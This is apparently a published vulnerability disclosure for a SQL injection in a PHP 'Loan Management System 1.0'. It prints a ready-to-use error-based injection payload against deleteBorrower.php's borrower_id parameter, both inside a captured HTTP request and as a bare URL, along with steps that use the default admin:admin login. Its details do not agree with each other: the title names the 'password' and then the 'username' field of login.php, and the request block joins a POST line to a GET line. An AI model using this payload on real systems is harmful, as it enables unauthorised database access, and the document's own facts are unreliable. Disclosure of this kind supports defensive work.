

# Loan Management System - login.php 'password' SQL inject

#### Exploit Title: Loan Management System - login.php 'username' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/15529/loan-management-system-oop-php-mysqlijquery-free-source-code.html

#### Software Link:https://www.sourcecodester.com/php/15529/loan-management-system-oop-php-mysqlijquery-free-source-code.html

#### Version: Loan Management System 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Loan Management System does not filter the content correctly at the "deleteBorrower.php/borrower_id" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /login.php HTTP/1.1
GET /deleteBorrower.php?borrower_id=1'%20AND%20GTID_SUBSET(CONCAT("data:",database()),8194)--%20GZSp HTTP/1.1
Host: 192.168.67.11:8091
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.67.11:8091/borrower.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bes3u5nf3elraj4jtmpnaoac0n
Connection: close
```

#### Proof of Concept

1、Log in to the system using the default password admin: admin

2、Add a piece of data on the Borrower page

![image](https://github.com/joinia/webray.com.cn/blob/main/Loan-Management-System/images/browsersql1.png)

3、Click 'delete' and grab the package, locate the file as' deleteBrower.php '.Looking at the source code, it is found that the borrower_id field is directly brought into the SQL statement query without filtering

![image](https://github.com/joinia/webray.com.cn/blob/main/Loan-Management-System/images/browsersql2.png)

4、We can construct SQL statements to query the name of the database

payload:`http://xxxx/deleteBorrower.php?borrower_id=1'%20AND%20GTID_SUBSET(CONCAT("data:",database()),8194)--%20GZSp`

![image](https://github.com/joinia/webray.com.cn/blob/main/Loan-Management-System/images/browsersql3.png)

5、Testing using the sqlmap tool can also detect SQL injection vulnerabilities

![image](https://github.com/joinia/webray.com.cn/blob/main/Loan-Management-System/images/browsersql4.png)
